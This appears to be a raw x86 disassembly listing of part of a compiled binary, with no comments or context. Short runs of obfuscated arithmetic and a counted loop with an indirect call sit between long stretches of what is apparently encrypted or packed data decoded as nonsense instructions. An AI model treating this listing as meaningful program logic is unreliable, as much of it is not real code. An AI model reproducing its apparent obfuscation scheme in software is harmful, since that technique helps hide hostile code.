  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	inc    edi
  408778:	mov    BYTE PTR [ebx],0x9e
  40877b:	int3   
  40877c:	out    0x78,eax
  40877e:	js     0x4087e4
  408780:	jle    0x4087fa
  408782:	js     0x40879a
  408784:	mov    dh,cl
  408786:	sbb    al,0x77
  408788:	in     al,dx
  408789:	clc    
  40878a:	adc    bh,BYTE PTR [edx+0xfbe1e2e]
  408790:	mov    ch,0xd2
  408792:	(bad)  [edx+0x36e082f4]
  408798:	icebp  
  408799:	repnz or ebp,DWORD PTR [edx]
  40879c:	lea    edi,[edi-0x60]
  40879f:	clc    
  4087a0:	stc    
  4087a1:	stos   DWORD PTR es:[edi],eax
  4087a2:	icebp  
  4087a3:	fwait
  4087a4:	(bad)  
  4087a5:	dec    eax
  4087a6:	xchg   esp,eax
  4087a7:	pop    eax
  4087a8:	cs xor al,0xa9
  4087ab:	push   0xfffffff6
  4087ad:	out    0x9c,eax
  4087af:	stos   DWORD PTR es:[edi],eax
  4087b0:	sbb    cl,cl
  4087b2:	jne    0x408748
  4087b4:	mov    ecx,0x54c6f322
  4087b9:	pop    es
  4087ba:	imul   ecx,DWORD PTR [ebx],0x11ea5730
  4087c0:	js     0x408829
  4087c2:	lock adc bh,al
  4087c5:	add    al,0x6a
  4087c7:	add    edx,DWORD PTR [edx-0x71]
  4087ca:	jecxz  0x40883d
  4087cc:	dec    esp
  4087cd:	mov    BYTE PTR [ebp+0x5bd1bf58],dl
  4087d3:	out    0x8f,al
  4087d5:	push   0xdfe8506d
  4087da:	stos   DWORD PTR es:[edi],eax
  4087db:	xor    DWORD PTR [edx+0x37],0x247a41e3
  4087e2:	lahf   
  4087e3:	pop    ss
  4087e4:	addr16 mov ecx,0xd8ad2e79
  4087ea:	loopne 0x408869
  4087ec:	(bad)  
  4087ed:	push   0xffffffa5
  4087ef:	cmp    ch,BYTE PTR gs:[ecx+0x3d]
  4087f3:	sbb    ebp,0x3234a333
  4087f9:	cs sub edx,eax
  4087fc:	repz (bad) 
  4087fe:	mov    edx,0xd598d042
  408803:	sbb    eax,0xfcb1976b
  408808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408809:	mov    esp,0xbaf65f86
  40880e:	xor    esi,DWORD PTR [edx-0x3]
  408811:	(bad)
  408815:	retf   
  408816:	fstp   st(1)
  408818:	push   es
  408819:	(bad)  
  40881a:	push   0x1a
  40881c:	(bad)  
  40881d:	in     al,0x53
  40881f:	cmc    
  408820:	out    dx,eax
  408821:	xor    eax,DWORD PTR [ecx]
  408823:	mov    eax,0x3fa45400
  408828:	rol    DWORD PTR [edx+edi*1-0x2dcd4723],1
  40882f:	ficom  WORD PTR [ebp+0x64]
  408832:	and    DWORD PTR ds:0x4cc2c119,ebp
  408838:	mov    ds:0x9db71dac,al
  40883d:	xchg   ebp,eax
  40883e:	mov    eax,0x8f826e26
  408843:	pushf  
  408844:	inc    edi
  408845:	sbb    BYTE PTR [edx+0x4f],bh
  408848:	and    eax,0x28885c9c
  40884d:	das    
  40884e:	pop    es
  40884f:	mov    bh,0x2b
  408851:	imul   esi,DWORD PTR [ecx+ebx*4-0x1c61fd23],0x1b
  408859:	outs   dx,BYTE PTR ds:[esi]
  40885a:	cld    
  40885b:	xchg   DWORD PTR [ecx+0x2ae78326],ebp
  408861:	add    dh,BYTE PTR [ebx-0x64]
  408864:	(bad)  
  408865:	adc    ch,dl
  408867:	out    dx,eax
  408868:	or     eax,DWORD PTR [edx+0x586d715e]
  40886e:	mov    ebp,0x58d99af6
  408873:	mov    esi,DWORD PTR [ebp-0x53b12fd2]
  408879:	cs inc edx
  40887b:	(bad)  
  40887c:	lock jnp 0x408851
  40887f:	mov    bh,0xc5
  408881:	push   0xb7843998
  408886:	xchg   esi,eax
  408887:	ja     0x40882f
  408889:	mov    es:0x8fcb4a57,eax
  40888f:	jmp    0x40888b
  408891:	push   DWORD PTR [edi+ebp*4+0x64]
  408895:	aad    0xf7
  408897:	push   es
  408898:	inc    esp
  408899:	nop
  40889a:	stc    
  40889b:	adc    al,0xc6
  40889d:	cmp    BYTE PTR ds:0x756bcf38,0x94
  4088a4:	retf   0x4fd6
  4088a7:	ss js  0x4088f2
  4088aa:	jae    0x4088f4
  4088ac:	cmp    al,bl
  4088ae:	outs   dx,BYTE PTR ds:[esi]
  4088af:	sub    BYTE PTR [ebx-0x1f33315f],al
  4088b5:	retf   0x601d
  4088b8:	or     eax,DWORD PTR [ebp-0x35]
  4088bb:	leave  
  4088bc:	mov    ebx,0x8ce98cd1
  4088c1:	push   0x4aca0ebd
  4088c6:	add    eax,0xb1bb660f
  4088cb:	retf   0x4eb
  4088ce:	fs sub al,0x1b
  4088d1:	push   ds
  4088d2:	mov    ss,WORD PTR [edx+0x84aeafb]
  4088d8:	push   ss
  4088d9:	xchg   BYTE PTR [edi],cl
  4088db:	out    dx,eax
  4088dc:	add    eax,esp
  4088de:	clc    
  4088df:	js     0x40888d
  4088e1:	imul   DWORD PTR [edi-0x2f9dd2ee]
  4088e7:	pop    edi
  4088e8:	cmp    BYTE PTR [ebx],bl
  4088ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088eb:	mov    DWORD PTR [esi+0x2c],0xafc387e1
  4088f2:	fs mov eax,0x6aec949c
  4088f8:	inc    esi
  4088f9:	stc    
  4088fa:	push   eax
  4088fb:	push   ss
  4088fc:	pop    esp
  4088fd:	adc    al,0xc5
  4088ff:	pop    ebp
  408900:	adc    esp,DWORD PTR [edx+0xa]
  408903:	ja     0x40895f
  408905:	fstp   DWORD PTR [eax+0x6a]
  408908:	adc    DWORD PTR [ecx],esp
  40890a:	aam    0xa7
  40890c:	adc    DWORD PTR [ebx+ebx*4-0x2d],edx
  408910:	sar    DWORD PTR [esi+ebp*8+0x2],cl
  408914:	fimul  WORD PTR [eax-0x652a60a1]
  40891a:	fild   DWORD PTR [edx]
  40891c:	or     ebp,edi
  40891e:	out    0xb6,al
  408920:	in     eax,dx
  408921:	enter  0x64da,0x8c
  408925:	ret    0x1eae
  408928:	xor    al,0xbf
  40892a:	push   eax
  40892b:	xor    DWORD PTR [ebx+eiz*4+0x62],0xffffffe2
  408930:	cmp    al,0xfc
  408932:	add    bh,ah
  408934:	push   0xec010be6
  408939:	popf   
  40893a:	loop   0x4089ad
  40893c:	jno    0x408915
  40893e:	adc    esp,edx
  408940:	jae    0x408972
  408942:	add    BYTE PTR [ebp+0x6769f0fc],cl
  408948:	out    dx,eax
  408949:	add    edi,edi
  40894b:	clc    
  40894c:	inc    eax
  40894d:	xchg   edi,eax
  40894e:	jle    0x408955
  408950:	(bad)  
  408951:	fild   QWORD PTR [edi+edi*1-0x12]
  408955:	aad    0xcf
  408957:	jecxz  0x4089c4
  408959:	push   ecx
  40895a:	ja     0x40893b
  40895c:	out    dx,al
  40895d:	xchg   edx,eax
  40895e:	adc    BYTE PTR [ecx+0x5e5c6069],cl
  408964:	xchg   esi,eax
  408965:	popa   
  408966:	arpl   WORD PTR ds:0xb04bb374,bp
  40896c:	mov    esi,0xfdff2315
  408971:	xchg   esp,eax
  408972:	pop    esi
  408973:	sbb    BYTE PTR [esi-0x59776079],0x29
  40897a:	cs or  eax,0x615472b9
  408980:	fst    DWORD PTR [ebx+eax*2+0x858b855]
  408987:	mov    ecx,0x8ddf63c6
  40898c:	inc    edi
  40898d:	cmp    dh,dh
  40898f:	xor    eax,0x2b49c7aa
  408994:	test   BYTE PTR [ebp+ebx*4-0x58f860ff],al
  40899b:	iret   
  40899c:	pop    ebp
  40899d:	stc    
  40899e:	push   esi
  40899f:	fcomp  DWORD PTR [edx-0x46]
  4089a2:	sbb    DWORD PTR [ecx],0xffffffda
  4089a5:	lahf   
  4089a6:	punpckhdq mm6,QWORD PTR [edi+0xa]
  4089aa:	push   cs
  4089ab:	push   0x4017493b
  4089b0:	xlat   BYTE PTR ds:[ebx]
  4089b1:	std    
  4089b2:	jmp    0xea9f:0x2e2c15db
  4089b9:	push   ss
  4089ba:	jbe    0x40894a
  4089bc:	std    
  4089bd:	xlat   BYTE PTR ds:[ebx]
  4089be:	mov    DWORD PTR [edi+ecx*1],eax
  4089c1:	adc    ch,BYTE PTR [edi]
  4089c3:	mov    edi,DWORD PTR [eax+0x2f243c15]
  4089c9:	cld    
  4089ca:	jmp    0x9e74:0x2f5c3ca9
  4089d1:	jl     0x408959
  4089d3:	cli    
  4089d4:	lahf   
  4089d5:	jns    0x408a34
  4089d7:	mov    al,ds:0x40d37ad4
  4089dc:	out    0x1,al
  4089de:	pop    esp
  4089df:	xchg   BYTE PTR [esi],dl
  4089e1:	dec    ebp
  4089e2:	fidivr WORD PTR [eax+0x78]
  4089e5:	outs   dx,DWORD PTR ds:[esi]
  4089e6:	scas   eax,DWORD PTR es:[edi]
  4089e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089e8:	push   0xc84ae63c
  4089ed:	and    DWORD PTR [edi+0x78285c5f],eax
  4089f3:	ja     0x408981
  4089f5:	call   0x6eed:0x297cfff
  4089fc:	lods   al,BYTE PTR ds:[esi]
  4089fd:	adc    ah,al
  4089ff:	jnp    0x40898f
  408a01:	imul   ebx,DWORD PTR ds:0x4872190e,0x3
  408a08:	loope  0x408a66
  408a0a:	push   edx
  408a0b:	and    al,0x6e
  408a0d:	mov    bh,0x36
  408a0f:	not    BYTE PTR [ebp-0x37]
  408a12:	cmp    DWORD PTR [eax],edi
  408a14:	dec    ebp
  408a15:	daa    
  408a16:	mov    ecx,0x4b66b079
  408a1b:	and    al,0xf1
  408a1d:	jmp    0xc992bcd0
  408a22:	dec    ecx
  408a23:	mov    dl,dh
  408a25:	and    edi,ecx
  408a27:	inc    ecx
  408a28:	not    DWORD PTR [ebx-0x5fb266c8]
  408a2e:	clc    
  408a2f:	jl     0x4089c9
  408a31:	jns    0x4089c6
  408a33:	jne    0x408a24
  408a35:	xchg   ebx,eax
  408a36:	sbb    ebp,DWORD PTR [esi-0x32]
  408a39:	(bad)  
  408a3a:	lock add dl,dl
  408a3d:	enter  0x5a64,0x30
  408a41:	mov    ds:0x61b8a1fd,eax
  408a46:	jmp    0x8ac457b3
  408a4b:	inc    ecx
  408a4c:	enter  0x990b,0x58
  408a50:	jle    0x408abb
  408a52:	mov    edx,ebp
  408a54:	push   es
  408a55:	mov    esi,0x75b016d7
  408a5a:	xchg   ecx,eax
  408a5b:	adc    al,0x25
  408a5d:	mov    ebp,0x9e6f2f47
  408a62:	push   ds
  408a63:	cmp    ch,BYTE PTR [edi+0x33]
  408a66:	push   es
  408a67:	xchg   edx,eax
  408a68:	fwait
  408a69:	sar    BYTE PTR [eax+0x7530abdd],0x89
  408a70:	add    DWORD PTR [esi-0x37],ebx
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x6cb3a4f9
  408a92:	loope  0x408acb
  408a94:	sahf   
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408aa6
  408a9e:	mov    bh,0xee
  408aa0:	bound  eax,QWORD PTR [edx-0x4]
  408aa3:	jl     0x408ad0
  408aa5:	dec    edx
  408aa6:	dec    edx
  408aa7:	add    BYTE PTR [esi+eax*1+0x3278ec5c],dl
  408aae:	pop    ebx
  408aaf:	enter  0x79e0,0x12
  408ab3:	fsub   DWORD PTR [ebx+0x62]
  408ab6:	mov    edi,0xc14b9cee
  408abb:	cmp    al,0xc3
  408abd:	xchg   esi,eax
  408abe:	jb     0x408ab0
  408ac0:	mov    edx,0x9d087851
  408ac5:	je     0x408b1c
  408ac7:	call   0xd6d8:0x9d35d188
  408ace:	rol    ecx,cl
  408ad0:	pop    ds
  408ad1:	mov    cl,al
  408ad3:	ficom  WORD PTR [ebx-0x6]
  408ad6:	scas   eax,DWORD PTR es:[edi]
  408ad7:	jp     0x408b31
  408ad9:	mov    bh,0xd3
  408adb:	pop    edx
  408adc:	fnsave ds:0xdbeec38d
  408ae2:	out    dx,al
  408ae3:	mov    ch,0xc6
  408ae5:	outs   dx,BYTE PTR ds:[esi]
  408ae6:	fiadd  DWORD PTR fs:[ebx-0x7d17a2d7]
  408aed:	dec    esi
  408aee:	jns    0x408b02
  408af0:	hlt    
  408af1:	dec    ebx
  408af2:	scas   al,BYTE PTR es:[edi]
  408af3:	cli    
  408af4:	popf   
  408af5:	(bad)  
  408af7:	pop    eax
  408af8:	dec    ebx
  408af9:	sub    eax,0xefb59554
  408afe:	sbb    cl,BYTE PTR [esi-0x1c]
  408b01:	ss lahf 
  408b03:	sbb    BYTE PTR [eax],cl
  408b05:	xor    eax,esp
  408b07:	mov    ?,WORD PTR [ecx]
  408b09:	sbb    BYTE PTR [eax-0x29f7b52c],bl
  408b0f:	jnp    0x408ae9
  408b11:	(bad)
  408b15:	enter  0x9b89,0x30
  408b19:	das    
  408b1a:	imul   ecx,DWORD PTR [edi],0x83c6f2b1
  408b20:	je     0x408ac9
  408b22:	daa    
  408b23:	jno    0x408b9f
  408b25:	pop    edi
  408b26:	jl     0x408aed
  408b28:	sub    edi,esi
  408b2a:	mov    eax,0xf44b4c0b
  408b2f:	std    
  408b30:	add    BYTE PTR [edi-0x63],0xd
  408b34:	lock jmp 0x20885565
  408b3a:	add    al,BYTE PTR [edx]
  408b3c:	dec    esi
  408b3d:	test   BYTE PTR [ebx],dl
  408b3f:	arpl   WORD PTR [ecx+0x33],cx
  408b42:	sub    BYTE PTR [ebp+0x42],bh
  408b45:	sub    DWORD PTR [ecx+0x7c],esp
  408b48:	mov    ecx,0x20e14b7a
  408b4d:	call   0xc1141787
  408b52:	in     al,0xfa
  408b54:	retf   0x3667
  408b57:	pop    esi
  408b58:	push   ecx
  408b59:	xor    ebp,ebx
  408b5b:	xchg   edx,eax
  408b5c:	and    eax,0x659d99a3
  408b61:	push   ebp
  408b62:	dec    ebp
  408b63:	xchg   ecx,eax
  408b64:	xchg   edi,eax
  408b65:	xor    eax,0xfb940eb0
  408b6a:	loope  0x408b30
  408b6c:	adc    al,0xfd
  408b6e:	push   0xffffff95
  408b70:	stc    
  408b71:	das    
  408b72:	mov    edx,0x275d37d4
  408b77:	repnz xchg ebp,ecx
  408b7a:	pop    ecx
  408b7b:	xor    DWORD PTR [edi-0x6cca801b],ebx
  408b81:	shl    DWORD PTR [edx],cl
  408b83:	jmp    0xb0167788
  408b88:	or     BYTE PTR [eax+0x6a6c35d5],bh
  408b8e:	xchg   ecx,eax
  408b8f:	add    BYTE PTR ds:0x5a6f1ac7,al
  408b95:	jbe    0x408be3
  408b97:	mov    bl,0xf3
  408b99:	xchg   edi,eax
  408b9a:	pop    ds
  408b9b:	addr16 (bad) 
  408b9d:	imul   edx,DWORD PTR [ebx],0x55
  408ba0:	add    al,0xa9
  408ba2:	inc    edi
  408ba3:	scas   eax,DWORD PTR es:[edi]
  408ba4:	mov    bl,0xcb
  408ba6:	sbb    dh,dl
  408ba8:	leave  
  408ba9:	dec    esp
  408baa:	loope  0x408ba9
  408bac:	div    ch
  408bae:	xor    ecx,DWORD PTR [esp+eax*8+0x7401d4b0]
  408bb5:	jo     0x408baf
  408bb7:	out    0x2b,eax
  408bb9:	push   ebx
  408bba:	imul   edi,DWORD PTR [edx+0x54],0xffffffe6
  408bbe:	and    DWORD PTR [ebp+0x1a],edi
  408bc1:	push   0x77
  408bc3:	cmp    bh,BYTE PTR [edi+0x31cb2a61]
  408bc9:	scas   al,BYTE PTR es:[edi]
  408bca:	aam    0x9e
  408bcc:	mov    eax,ds:0x10122b72
  408bd1:	mov    esp,0xd7d2e917
  408bd6:	retf   
  408bd7:	icebp  
  408bd8:	sbb    edi,DWORD PTR [ecx-0x23]
  408bdb:	cmp    BYTE PTR ds:[ebx+ebp*1-0x2c85c767],0x5e
  408be4:	cwde   
  408be5:	and    DWORD PTR [eax-0x3b724319],edx
  408beb:	(bad)  
  408bec:	mov    bh,0xbe
  408bee:	cmp    edi,DWORD PTR [eax]
  408bf0:	mov    cl,bl
  408bf2:	xchg   al,al
  408bf4:	ins    BYTE PTR es:[edi],dx
  408bf5:	sub    BYTE PTR [ebp+0x4d4ba0cc],al
  408bfb:	xchg   esi,eax
  408bfc:	adc    al,BYTE PTR [ebp-0x7a50ed16]
  408c02:	mov    ebp,DWORD PTR [eax-0x65c2db0c]
  408c08:	push   0xd5ab1e24
  408c0d:	test   DWORD PTR [edi],ebx
  408c0f:	mov    esp,0x817087b8
  408c14:	mov    ds:0x9cdaa345,al
  408c19:	mov    cl,0xe6
  408c1b:	or     BYTE PTR [eax-0x6],ch
  408c1e:	call   0xa8bc:0x48870d6d
  408c25:	jb     0x408ba7
  408c27:	sub    al,0x85
  408c29:	leave  
  408c2a:	jnp    0x408c45
  408c2c:	sub    esi,esi
  408c2e:	aas    
  408c2f:	mov    dh,0x19
  408c31:	cmp    esi,DWORD PTR [ebx]
  408c33:	ins    BYTE PTR es:[edi],dx
  408c34:	xchg   ebx,eax
  408c35:	pusha  
  408c36:	add    ah,BYTE PTR [ebx]
  408c38:	add    eax,0x641ff683
  408c3d:	xchg   esp,eax
  408c3e:	sub    eax,0xbe996a22
  408c43:	jge    0x408c40
  408c45:	out    dx,eax
  408c46:	mov    ecx,0x3fff6fa7
  408c4b:	jno    0x408c6d
  408c4d:	out    dx,al
  408c4e:	mov    WORD PTR [esi],cs
  408c50:	cmc    
  408c51:	and    DWORD PTR [ebx],esi
  408c53:	add    BYTE PTR ds:0xd4e38836,0xb8
  408c5a:	pushf  
  408c5b:	mov    edi,0xd0d96a86
  408c60:	sbb    bh,ah
  408c62:	outs   dx,DWORD PTR ds:[esi]
  408c63:	in     eax,dx
  408c64:	es test ebx,eax
  408c67:	inc    edi
  408c68:	and    DWORD PTR [ecx+ebx*1],esi
  408c6b:	daa    
  408c6c:	inc    edi
  408c6d:	std    
  408c6e:	mov    eax,0x8bd5b5ed
  408c73:	cmp    BYTE PTR [esi+0x52d6334f],dl
  408c79:	mov    edx,DWORD PTR [esi-0x2ff6290e]
  408c7f:	sti    
  408c80:	test   eax,0x2ff334cd
  408c85:	xchg   BYTE PTR [esi],bh
  408c87:	push   edx
  408c88:	gs dec ecx
  408c8a:	mov    ds:0xb53c9bf1,eax
  408c8f:	push   DWORD PTR [ebp-0x60]
  408c92:	je     0x408cc7
  408c94:	jecxz  0x408cd5
  408c96:	ror    ch,1
  408c98:	cmp    eax,0x1ea7b346
  408c9d:	pop    edi
  408c9e:	lock pop ecx
  408ca0:	in     al,dx
  408ca1:	xor    edx,esp
  408ca3:	add    eax,0x3a7c186e
  408ca8:	js     0x408ca6
  408caa:	es cmp esi,ecx
  408cad:	mov    DWORD PTR [eax],ebp
  408caf:	lds    ebx,FWORD PTR [esi-0x69732f42]
  408cb5:	nop
  408cb6:	jmp    0xb7a51496
  408cbb:	pop    eax
  408cbc:	popa   
  408cbd:	jl     0x408c82
  408cbf:	add    eax,0xec33e08
  408cc4:	dec    esp
  408cc5:	aas    
  408cc6:	outs   dx,DWORD PTR ds:[esi]
  408cc7:	cmp    edx,DWORD PTR [ecx+0x59bd0103]
  408ccd:	daa    
  408cce:	das    
  408ccf:	jno    0x408c86
  408cd1:	out    dx,al
  408cd2:	clc    
  408cd3:	push   ebx
  408cd4:	fmul   DWORD PTR [esi+0x2b2d0f0]
  408cda:	push   eax
  408cdb:	fs ret 
  408cdd:	out    0x6,eax
  408cdf:	xor    al,ch
  408ce1:	ret    0x4bae
  408ce4:	loope  0x408d53
  408ce6:	repnz ins DWORD PTR es:[edi],dx
  408ce8:	and    edi,0xa2dff08a
  408cee:	push   ds
  408cef:	call   FWORD PTR [edx]
  408cf1:	jbe    0x408c93
  408cf3:	push   eax
  408cf4:	add    BYTE PTR [edx+edx*4+0x658ea1f5],dh
  408cfb:	jb     0x408cc8
  408cfd:	shr    BYTE PTR [eax],1
  408cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d00:	fimul  DWORD PTR ds:0xd7974657
  408d06:	les    esi,FWORD PTR [edx]
  408d08:	mov    eax,ds:0x621e4337
  408d0d:	pop    edx
  408d0e:	loopne 0x408cd5
  408d10:	inc    esp
  408d11:	sbb    al,0xf0
  408d13:	test   eax,0x9789c739
  408d18:	loop   0x408ce3
  408d1a:	fsubr  QWORD PTR [ebx]
  408d1c:	cwde   
  408d1d:	dec    ebp
  408d1e:	xor    dh,bh
  408d20:	stc    
  408d21:	je     0x408cd4
  408d23:	sub    bl,ch
  408d25:	je     0x408d57
  408d27:	retf   0xdb74
  408d2a:	sub    edx,DWORD PTR [esi+ebx*2]
  408d2d:	and    eax,0x547cfd78
  408d32:	inc    edx
  408d33:	nop
  408d34:	das    
  408d35:	mov    ds:0x47c12f02,eax
  408d3a:	push   ecx
  408d3b:	and    eax,0xf400d1f8
  408d40:	clc    
  408d41:	mov    eax,ds:0x70d6e715
  408d46:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  408d4d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  408d54:	mov    eax,DWORD PTR [ebp-0x4]
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffff99
  408e1d:	mov    bh,0xf4
  408e1f:	clc    
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	nop
  408e29:	(bad)  
  408e2a:	das    
  408e2b:	scas   al,BYTE PTR es:[edi]
  408e2c:	xor    al,0x2a
  408e2e:	push   edi
  408e2f:	pop    ebp
  408e30:	jl     0x408e16
  408e32:	pusha  
  408e33:	sub    BYTE PTR [edx-0x3b],ch
  408e36:	or     DWORD PTR ds:0x2fcb33df,edx
  408e3c:	mov    BYTE PTR [ebp+ebx*1-0x62],dl
  408e40:	in     al,0x8c
  408e42:	mov    ds:0xcfc191d1,eax
  408e47:	sbb    BYTE PTR [ecx+0x2394fc2d],bl
  408e4d:	sub    ebp,edx
  408e4f:	(bad)  
  408e50:	jecxz  0x408dea
  408e52:	std    
  408e53:	xor    DWORD PTR [ecx],ecx
  408e55:	add    eax,0x21b20d67
  408e5a:	lds    ecx,FWORD PTR [esi+eiz*2+0x416661db]
  408e61:	aam    0xe1
  408e63:	in     eax,dx
  408e64:	pop    esi
  408e65:	in     al,dx
  408e66:	test   ebp,edi
  408e68:	idiv   BYTE PTR [ecx-0x36]
  408e6b:	mov    cl,0x80
  408e6d:	or     al,0xe2
  408e6f:	or     ebp,DWORD PTR [ebp-0x20b6c3d9]
  408e75:	mov    bl,BYTE PTR [ebp-0x6840b15c]
  408e7b:	neg    BYTE PTR [ebx+0x7a5a715]
  408e81:	shl    dh,cl
  408e83:	jnp    0x408e69
  408e85:	out    dx,al
  408e86:	push   ebx
  408e87:	iret   
  408e88:	push   ds
  408e89:	sub    BYTE PTR [edx+0x27bde9a4],ah
  408e8f:	push   edx
  408e90:	inc    esi
  408e91:	sbb    eax,0xfcd1b71c
  408e96:	cwde   
  408e97:	ja     0x408e65
  408e99:	jbe    0x408e3c
  408e9b:	jmp    0x412a:0xaf245760
  408ea2:	fwait
  408ea3:	and    eax,0x102c3cd7
  408ea8:	sbb    DWORD PTR [ebp+edx*1-0x2],esp
  408eac:	push   esi
  408ead:	push   ebx
  408eae:	mov    esi,0x6a384cb0
  408eb3:	jnp    0x408e4c
  408eb5:	retf   0xbf1c
  408eb8:	int3   
  408eb9:	sub    DWORD PTR [edi+0x267216a],0x55
  408ec0:	int3   
  408ec1:	mov    ds:0xe28db604,eax
  408ec6:	ds (bad) 
  408ec8:	sbb    esp,edi
  408eca:	mov    al,ds:0x24ce9f9e
  408ecf:	shr    dh,1
  408ed1:	outs   dx,DWORD PTR ds:[esi]
  408ed2:	fisttp DWORD PTR [ecx]
  408ed4:	add    DWORD PTR [eax-0x2d],edx
  408ed7:	test   eax,0x528b4b5d
  408edc:	mov    edi,0xa109de72
  408ee1:	(bad)  
  408ee3:	lock into 
  408ee5:	push   eax
  408ee6:	mov    eax,ds:0x988f51b0
  408eeb:	lods   eax,DWORD PTR ds:[esi]
  408eec:	call   0x8b35:0xcbf9d37f
  408ef3:	ret    0x208c
  408ef6:	test   BYTE PTR [ebp+0x7b94e887],ah
  408efc:	mov    al,0xda
  408efe:	out    0x8,eax
  408f00:	inc    edi
  408f01:	xchg   edi,eax
  408f02:	inc    DWORD PTR [ecx]
  408f04:	cld    
  408f05:	xchg   ebx,eax
  408f06:	sbb    eax,0x3a759e00
  408f0b:	into   
  408f0c:	sbb    dh,BYTE PTR [esi]
  408f0e:	aam    0xfa
  408f10:	nop
  408f11:	outs   dx,BYTE PTR ds:[esi]
  408f12:	or     eax,0x26cb2852
  408f17:	xor    esp,DWORD PTR [ebp+ebp*1-0x3e]
  408f1b:	and    eax,0x590fbb10
  408f20:	cli    
  408f21:	cld    
  408f22:	mov    esi,0x1628f65b
  408f27:	inc    edx
  408f28:	inc    ebp
  408f29:	lock sbb DWORD PTR [esi-0xf],edi
  408f2d:	popf   
  408f2e:	cmp    DWORD PTR [ebp-0x32361ec9],esi
  408f34:	inc    esi
  408f35:	scas   eax,DWORD PTR es:[edi]
  408f36:	sub    eax,0xf444282
  408f3b:	out    0xa0,eax
  408f3d:	cs gs pop edx
  408f40:	jmp    0x408f38
  408f42:	inc    eax
  408f43:	mov    esi,0x9eabaec8
  408f48:	cs sub al,0xb3
  408f4b:	rol    BYTE PTR [edi],cl
  408f4d:	dec    eax
  408f4e:	cwde   
  408f4f:	out    dx,eax
  408f50:	sub    DWORD PTR [edx-0x20e05dc2],0xadd42739
  408f5a:	jo     0x408f00
  408f5c:	dec    ecx
  408f5d:	inc    ebx
  408f5e:	(bad)  
  408f5f:	jns    0x408fca
  408f61:	stos   BYTE PTR es:[edi],al
  408f62:	cmc    
  408f63:	scas   al,BYTE PTR es:[edi]
  408f64:	retf   
  408f65:	pop    ebp
  408f66:	fstp   DWORD PTR [esi-0x71]
  408f69:	mov    ds:0x4134318b,al
  408f6e:	arpl   WORD PTR [esi-0x71],dx
  408f71:	cmp    DWORD PTR [ebp+edx*2+0x55],ebp
  408f75:	cmp    edx,DWORD PTR [edi+0x66c9973f]
  408f7b:	ins    DWORD PTR es:[edi],dx
  408f7c:	cmp    esi,DWORD PTR [ebp-0x1927b26]
  408f82:	adc    DWORD PTR ds:0x58731695,0x4c
  408f89:	out    dx,al
  408f8a:	dec    ebx
  408f8b:	xchg   DWORD PTR [ecx+ebx*2+0x7ea40e8e],eax
  408f92:	jl     0x408fbf
  408f94:	gs or  eax,0x6307c635
  408f9a:	lods   eax,DWORD PTR ds:[esi]
  408f9b:	mov    dl,0x7e
  408f9d:	add    al,0x2f
  408f9f:	stc    
  408fa0:	push   ebp
  408fa1:	in     eax,dx
  408fa2:	leave  
  408fa3:	mov    al,0xf1
  408fa5:	adc    BYTE PTR [edi-0xe7b893c],0x35
  408fac:	add    eax,0xce190331
